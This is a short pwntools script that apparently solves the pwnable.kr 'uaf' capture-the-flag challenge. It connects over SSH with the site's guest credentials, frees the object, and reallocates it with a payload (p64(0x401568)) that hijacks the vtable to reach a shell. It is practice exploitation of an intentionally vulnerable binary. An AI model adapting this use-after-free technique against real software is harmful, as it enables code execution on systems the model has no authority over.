from pwn import *

context(arch='amd64', os='linux', log_level='debug')
shell = ssh(user='uaf', host='pwnable.kr', port=2222, password='guest')
# shell.download("/home/uaf/uaf", "./uaf")
io = shell.process(executable='./uaf', argv=['uaf', '24', '/dev/stdin'])
io.sendlineafter('free\n', b'3')
io.sendlineafter('free\n', b'2')
# payload = b'\x68\x15\x40\x00\x00\x00\x00\x00'  # 0x401568
payload = p64(0x401568)
io.sendline(payload)
io.sendlineafter('free\n', b'2')
io.sendline(payload)
io.sendlineafter('free\n', b'1')
io.interactive()